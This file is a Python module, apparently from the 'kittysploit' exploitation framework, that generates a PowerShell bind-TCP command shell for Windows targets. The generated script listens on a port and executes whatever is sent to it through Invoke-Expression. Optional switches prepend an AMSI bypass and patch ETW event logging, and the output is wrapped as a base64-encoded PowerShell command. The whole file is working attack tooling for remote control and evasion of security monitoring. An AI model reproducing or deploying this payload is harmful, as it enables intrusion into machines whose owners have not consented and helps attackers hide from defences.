#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64

from lib.c2.stager_evasion import powershell_prelude


class Module(Payload):

    CLIENT_LANGUAGE = "powershell"

    __info__ = {
        'name': 'PowerShell Command Shell, Bind TCP',
        'description': 'Listen on the target and expose a command shell via PowerShell',
        'category': PayloadCategory.SINGLE,
        'arch': Arch.OTHER,
        'platform': Platform.WINDOWS,
        'listener': 'listeners/multi/bind_tcp',
        'handler': Handler.BIND,
        'session_type': SessionType.SHELL
    }

    rhost = OptString('0.0.0.0', 'Address to bind on the target', True)
    rport = OptPort(4444, 'Port to bind on the target', True)
    bypass_amsi = OptBool(False, 'Prepend AMSI bypass to generated stager', False, True)
    patch_etw = OptBool(False, 'Patch EtwEventWrite in stager process', False, True)
    encoder = OptString('', 'Encoder', False, True)

    def _build_script(self) -> str:
        body = (
            f"$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('{self.rhost}'),{self.rport});"
            "$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "$prompt='PS '+(pwd).Path+'> ';$pb=[text.encoding]::ASCII.GetBytes($prompt);$s.Write($pb,0,$pb.Length);"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "if($d.Trim().ToLower() -in @('exit','quit')){break};"
            "$o=(iex $d 2>&1|Out-String);"
            "$r=$o+'PS '+(pwd).Path+'> ';"
            "$rb=[text.encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()"
            "};$c.Close();$l.Stop()"
        )
        return powershell_prelude(
            bypass_amsi=bool(self.bypass_amsi),
            patch_etw=bool(self.patch_etw),
        ) + body

    def generate(self):
        encoded_script = base64.b64encode(self._build_script().encode('utf-16le')).decode('utf-8')
        return f"powershell -nop -EncodedCommand {encoded_script}"
